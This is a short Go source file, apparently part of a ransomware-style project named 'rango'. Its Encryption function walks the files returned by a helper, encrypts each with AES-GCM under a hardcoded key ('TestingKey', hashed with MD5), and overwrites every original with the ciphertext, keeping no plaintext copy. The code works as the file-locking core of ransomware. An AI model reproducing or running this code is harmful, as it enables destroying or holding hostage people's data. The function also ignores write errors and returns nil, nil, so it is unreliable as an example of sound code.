package rango

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	helper "rango/src/Helper"
)

func mdHashing(input string) string {
	byteInput := []byte(input)
	md5Hash := md5.Sum(byteInput)
	return hex.EncodeToString(md5Hash[:]) // by referring to it as a string
}

func Encryption() ([]byte, error) {

	//Gonna check if the file is already encrypted

	key := "TestingKey"
	test_files, err := helper.Openfolder()
	helper.Error(err)

	for _, test_file := range test_files {
		file_content, err := os.ReadFile(test_file)
		extension := filepath.Ext(test_file)

		helper.Error(err)

		fmt.Printf("%s is the type of this file\n", extension)

		aesBlock, err := aes.NewCipher([]byte(mdHashing(string(key))))
		helper.Error(err)

		gcmInstance, err := cipher.NewGCM(aesBlock)

		helper.Error(err)

		nonce := make([]byte, gcmInstance.NonceSize())
		_, _ = io.ReadFull(rand.Reader, nonce)

		ciphered_text := gcmInstance.Seal(nonce, nonce, []byte(file_content), nil)

		err = os.WriteFile(test_file, ciphered_text, 0644)

	}
	return nil, nil
}
